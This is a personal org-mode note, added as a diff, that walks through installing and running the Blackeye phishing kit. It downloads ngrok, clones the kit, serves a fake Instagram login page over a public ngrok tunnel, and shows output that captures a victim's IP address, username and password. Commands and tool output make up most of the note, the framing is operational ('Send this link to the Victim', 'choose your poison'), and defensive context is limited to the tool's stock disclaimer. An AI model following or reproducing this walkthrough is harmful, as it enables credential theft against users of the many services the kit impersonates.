@@ -1,0 +1,109 @@
+#+title:Phishing
+#+roam_tags: Social_Engineering
+
+TODO:
+1. Fake Website
+
+* Gophish
+
+WEB: https://getgophish.com/
+GIT: https://github.com/gophish/gophish
+
+* Blackeye
+
+GIT: https://github.com/An0nUD4Y/blackeye
+
+Installation:
+- PHP ( Should be available in Kali Linux )
+- Ngrok ( Create your account first )
+- GIthub Account ( Easier )
+
+This preparation are needed, because =blackeye.sh= are not working as intended, as precaution, we have to manually run the ngrok server and serve the php to our http://localhost:8080 ( or another port ) to get it to works.
+
+Here is the command you need to install and setup ngrok.
+
+#+begin_src shell
+$ wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
+$ unzip ngrok-stable-linux-amd64.zip
+$ ./ngrok authtoken 0000000000000000000000000000000000000000000000000
+#+end_src
+
+Now clone blackeye from An0nUD4Y repos.
+
+#+begin_src shell
+$ git clone https://github.com/An0nUD4Y/blackeye
+$ cd blackeye
+#+end_src
+
+To actually run blackeye, you have to serve the php first and then the ngrok server, and you will see a screen like this.
+
+#+begin_src shell
+ngrok by @inconshreveable
+
+Session Status                online
+Account                       account-name (Plan: Free)
+Version                       2.3.35
+Region                        United States (us)
+Web Interface                 http://127.0.0.1:4040
+Forwarding                    http://alphanumeric.ngrok.io -> http://localhost:8080
+Forwarding                    https://alphanumeric.ngrok.io -> http://localhost:8080
+
+Connections                   ttl     opn     rt1     rt5     p50     p90
+                              22      0       0.25    0.07    0.06    3.14
+#+end_src
+
+And then you can connect to php by using this command:
+
+#+begin_src shell
+$ php -d /path/to/blackeye/sites/instagram -S localhost:8080
+#+end_src
+
+Lastly run this command to actually run blackeye. Above preparation are just in case that you're not seeing ngrok Link.
+
+#+begin_src shell
+$ sudo ./blackeye.sh # Password Needed
+
+[sudo] password for archaict:
+
+     :: Disclaimer: Developers assume no liability and are not    ::
+     :: responsible for any misuse or damage caused by BlackEye.  ::
+     :: Only use for educational purporses!!                      ::
+
+     ::     BLACKEYE v1.5! By @suljot_gjoka & @thelinuxchoice     ::
+
+          [01] Instagram      [17] DropBox        [33] eBay
+          [02] Facebook       [18] Adobe ID       [34] Amazon
+          [03] Snapchat       [19] Shopify        [35] iCloud
+          [04] Twitter        [20] Messenger      [36] Spotify
+          [05] Github         [21] GitLab         [37] Netflix
+          [06] Google         [22] Twitch         [38] Custom
+          [07] Origin         [23] MySpace
+          [08] Yahoo          [24] Badoo
+          [09] Linkedin       [25] VK
+          [10] Protonmail     [26] Yandex
+          [11] Wordpress      [27] devianART
+          [12] Microsoft      [28] Wi-Fi
+          [13] IGFollowers    [29] PayPal
+          [14] Pinterest      [30] Steam
+          [15] Apple ID       [31] Bitcoin
+          [16] Verizon        [32] Playstation
+
+[*] Choose an option: 1 # choose your poison
+
+[*] Starting php server...
+[*] Starting ngrok server...
+[*] Send this link to the Victim: # This link are served above
+[*] Waiting victim open the link ...
+
+[*] IP Found!
+[*] Victim IP: 127.0.0.1 # It will be your public IP here (SECRET)
+[*] User-Agent:  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/XX.0
+[*] Saved: instagram/saved.ip.txt
+
+[*] Waiting credentials ...
+
+[*] Credentials Found!
+[*] Account: helloWorld
+[*] Password:  12345678
+[*] Saved: sites/instagram/saved.usernames.txt
+#+end_src
